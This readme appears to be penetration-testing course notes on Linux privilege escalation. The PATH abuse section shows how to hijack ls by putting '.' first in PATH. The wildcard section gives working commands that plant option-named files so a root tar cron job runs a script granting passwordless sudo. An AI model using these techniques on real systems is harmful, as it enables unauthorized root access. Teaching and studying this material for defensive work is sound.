readme.md


<a id="org6d2022e"></a>

## Path Abuse

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat` `/tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

    echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

    pwd && conncheck 

As shown below, `the conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.

    pwd && conncheck 
    
    /tmp
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2   

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add . to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

    echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    
    PATH=.:${PATH}
    export PATH
    echo $PATH
    
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

    touch ls
    echo 'echo "PATH ABUSE!!"' > ls
    chmod +x ls
    
    ls
    
    PATH ABUSE!!


<a id="org15d85a8"></a>

## Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Characters</th>
<th scope="col" class="org-left">Significance</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left"><code>*</code></td>
<td class="org-left">An asterisk that can match any number of characters in a file name.</td>
</tr>


<tr>
<td class="org-left"><code>?</code></td>
<td class="org-left">Matches a single character.</td>
</tr>


<tr>
<td class="org-left"><code>[ ]</code></td>
<td class="org-left">Brackets enclose characters and can match any single one at the defined position.</td>
</tr>


<tr>
<td class="org-left"><code>~</code></td>
<td class="org-left">A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td>
</tr>


<tr>
<td class="org-left"><code>-</code></td>
<td class="org-left">A hyphen within brackets will denote a range of characters.</td>
</tr>
</tbody>
</table>

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the man page for the `tar` command, we see the following:

    man tar
    
    <SNIP>
    Informative output
           --checkpoint[=N]
                  Display progress messages every Nth record (default 10).
    
           --checkpoint-action=ACTION
                  Run ACTION on each checkpoint.sh

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/root` directory's contents and create a compressed archive in `/tmp`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

    #
    #
    mh dom mon dow command
    */01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

    echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    echo "" > "--checkpoint-action=exec=sh root.sh"
    echo "" > --checkpoint=1

We can check and see that the necessary files were created.

    ls -la
    
    total 56
    drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
    drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
    -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
    -rw-rw-r--  1 user        user           1 Aug 31 23:11 --checkpoint=1
    -rw-rw-r--  1 user        user           1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
    -rw-rw-r--  1 user        user          60 Aug 31 23:11 root.sh

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

      sudo -l
    
    Matching Defaults entries for cliff.moore on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User cliff.moore may run the following commands on NIX02:
        (root) NOPASSWD: ALL
